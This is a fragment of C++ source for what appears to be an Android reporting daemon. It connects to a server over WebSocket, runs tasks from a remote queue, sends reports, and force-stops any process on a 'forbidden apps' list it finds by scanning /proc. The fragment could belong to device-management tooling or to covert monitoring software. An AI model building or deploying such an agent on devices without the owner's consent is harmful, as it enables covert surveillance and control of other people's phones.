            log_message("WS connected");
        } else if (msg->type == ix::WebSocketMessageType::Error) {
            log_message("WS error: " + msg->errorInfo.reason);
        }
    });
    g_webSocket.start();

    
    std::thread([]() {
        char path[256], cmdline[256];
        while (true) {
            std::unique_lock<std::mutex> lk(g_forbiddenMutex);
            g_forbiddenCV.wait(lk, [] { return !g_forbiddenApps.empty(); });
            std::vector<std::string> apps = g_forbiddenApps;
            std::unordered_set<std::string> remaining(apps.begin(), apps.end());
            lk.unlock();

            DIR* dir = opendir("/proc");
            if (dir) {
                struct dirent* ent;
                while ((ent = readdir(dir)) != nullptr && !remaining.empty()) {
                    if (!isdigit(ent->d_name[0])) continue;
                    snprintf(path, sizeof(path), "/proc/%s/cmdline", ent->d_name);
                    int fd = open(path, O_RDONLY);
                    if (fd < 0) continue;
                    ssize_t bytes = read(fd, cmdline, sizeof(cmdline)-1);
                    close(fd);
                    if (bytes <= 0) continue;
                    cmdline[bytes] = '\0';
                    for (auto it = remaining.begin(); it != remaining.end(); ) {
                        const std::string& pkg = *it;
                        const std::string  pfx = pkg + ":";
                        if (strcmp(cmdline, pkg.c_str()) == 0
                            || strncmp(cmdline, pfx.c_str(), pfx.size()) == 0) {
                            run_command_no_output({"am", "force-stop", pkg});
                            it = remaining.erase(it);
                        } else { ++it; }
                    }
                }
                closedir(dir);
            }
            std::this_thread::sleep_for(std::chrono::seconds(30));
        }
    }).detach();

    
    for (int i = 0; i < 50; ++i) {
        if (g_webSocket.getReadyState() == ix::ReadyState::Open) break;
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }

    
    while (true) {
        if (access(DISABLE_FILE, F_OK) == 0) {
            std::this_thread::sleep_for(std::chrono::seconds(10));
            continue;
        }
        
        {
            std::unique_lock<std::mutex> lk(g_taskMutex);
            if (!g_taskQueue.empty()) { lk.unlock(); process_tasks(); }
        }

        do_report();

        int wait_s = std::max(1, g_ping_interval.load());
        std::unique_lock<std::mutex> lk(g_taskMutex);
        g_taskCV.wait_for(lk, std::chrono::seconds(wait_s), [] { return !g_taskQueue.empty(); });
        lk.unlock();

        process_tasks();
    }

    log_message("Reporter shutting down.");
    g_webSocket.stop();
    ix::uninitNetSystem();
    if (g_log_file) fclose(g_log_file);
    return 0;
}